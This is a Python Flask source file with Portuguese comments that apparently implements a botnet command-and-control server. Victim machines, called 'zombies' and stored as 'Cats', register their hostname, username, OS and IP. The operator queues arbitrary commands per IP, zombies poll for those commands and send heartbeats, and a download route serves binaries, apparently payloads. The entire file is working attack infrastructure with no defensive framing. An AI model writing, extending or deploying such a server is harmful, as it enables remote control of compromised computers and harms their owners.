import requests
from flask import Flask, request, jsonify, redirect, url_for, send_from_directory, render_template
from flask_sqlalchemy import SQLAlchemy
from flask_migrate import Migrate
from sqlalchemy import text
from datetime import datetime, timedelta, timezone
import os

app = Flask(__name__)
app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///data.db"
db = SQLAlchemy(app)
migrate = Migrate(app, db)

BIN_FOLDER = os.path.join(app.root_path, 'bin')
TIMEOUT_SECONDS = 60  # Considerar offline após 60 segundos sem contato

#Tabela Cat (zombie)

class Cats(db.Model):

    __tablename__ = "Cats"

    id = db.Column(db.Integer, primary_key=True, autoincrement=True)
    pcName = db.Column(db.String(50))
    stat = db.Column(db.String(50))
    ip = db.Column(db.String(50))
    username = db.Column(db.String(50))
    os = db.Column(db.String(50))
    last_seen = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))

    def __repr__(self):
        return f"Username: {self.username}>"
    
    def is_online(self):
        """Verifica se o zombie está online baseado no tempo decorrido"""
        if self.last_seen is None:
            return False
        
        # Garantir que ambos os datetimes têm timezone para comparação
        now_utc = datetime.now(timezone.utc)
        last_seen = self.last_seen
        
        # Se last_seen não tem timezone, adicionar UTC
        if last_seen.tzinfo is None:
            last_seen = last_seen.replace(tzinfo=timezone.utc)
        
        time_diff = now_utc - last_seen
        return time_diff.total_seconds() < TIMEOUT_SECONDS
    
    def to_dict(self):
        return {
            "id": self.id,
            "pcName": self.pcName,
            "stat": "Online" if self.is_online() else "Offline",
            "ip": self.ip,
            "username": self.username,
            "os": self.os,
            "last_seen": self.last_seen.isoformat() if self.last_seen else None
        }
    

# Tabela Command

class Commands(db.Model):

    __tablename__ = "Commands"

    id = db.Column(db.Integer, primary_key=True, autoincrement=True)
    command = db.Column(db.String(50))
    zombie_ip = db.Column(db.String(50))
    executed = db.Column(db.Boolean, default=False)

    def __repr__(self):
        return f"{self.command}"

# Rotas

@app.route("/", methods=["GET"])
def index():
    return render_template("index.html")

@app.route("/getCats", methods=["GET"])
def get_cats():
    cats = Cats.query.all()
    return jsonify([cat.to_dict() for cat in cats])

@app.route("/addCat", methods=["GET"])
def add_cat():
    pcName = request.args.get("pcName")
    username = request.args.get("username")
    os = request.args.get("os")
    stat = "Online"
    # Se o cliente enviar seu próprio IP, usa. Senão, usa o remote_addr
    ip = request.args.get("ip") if request.args.get("ip") else request.remote_addr

    # Verificar se o IP já foi cadastrado
    existing_cat = Cats.query.filter_by(ip=ip).first()
    if existing_cat:
        return f"IP {ip} already registered!", 409

    new_cat = Cats(pcName=pcName, stat=stat, ip=ip, username=username, os=os)
    if new_cat is None:
        return "Error creating cat", 400
    else:
        db.session.add(new_cat)
        db.session.commit()
        return "Cat added successfully!"

@app.route('/sendCommand', methods=['POST'])
def save_command():
    try:
        print("[DEBUG] Recebido POST /sendCommand")
        data = request.json
        print(f"[DEBUG] Data: {data}")
        
        if not data:
            return jsonify({"success": False, "message": "No JSON data received"}), 400
        
        zombie_ip = data.get('zombieIP')
        command = data.get('command')
        
        print(f"[DEBUG] Zombie IP: {zombie_ip}, Command: {command}")
        
        if not zombie_ip or not command:
            return jsonify({"success": False, "message": "Missing zombieIP or command"}), 400
        
        new_command = Commands(command=command, zombie_ip=zombie_ip)
        db.session.add(new_command)
        db.session.commit()
        print("[DEBUG] Comando salvo no BD com sucesso")
        
        return jsonify({"success": True, "message": f"Command saved successfully for {zombie_ip}!"})
    except Exception as e:
        print(f"[ERROR] {str(e)}")
        import traceback
        traceback.print_exc()
        return jsonify({"success": False, "message": f"Error: {str(e)}"}), 500

@app.route('/sendCommand', methods=['GET'])
def send_command():
    # Obter o IP do cliente
    client_ip = request.remote_addr
    print(f"[DEBUG] Client IP solicitou comando: {client_ip}")
    
    # Atualizar o last_seen do zombie (heartbeat)
    cat = Cats.query.filter_by(ip=client_ip).first()
    if cat:
        cat.last_seen = datetime.now(timezone.utc)
        db.session.commit()
        print(f"[DEBUG] Heartbeat recebido de {client_ip}")
    
    # Busca o comando não executado mais recente para este IP específico
    result = Commands.query.filter_by(executed=False, zombie_ip=client_ip).order_by(Commands.id.desc()).first()
    
    if result:
        # Marca como executado
        result.executed = True
        db.session.commit()
        print(f"[DEBUG] Comando executado para {client_ip}: {result.command}")
        return result.command
    
    return "No commands found."

# @app.route('/activeService', methods=['GET'])
# def active_service():
#     ip = request.args.get('ip')
#     service_port = 1212
#     url = 'http://{}:{}/'.format(ip, service_port)
#     requests.get(url, timeout=5)
#     return f"Command sent to {ip} successfully!"

@app.route('/download/<filename>', methods=['GET'])
def download_file(filename):
    return send_from_directory(BIN_FOLDER, filename, as_attachment=True)
    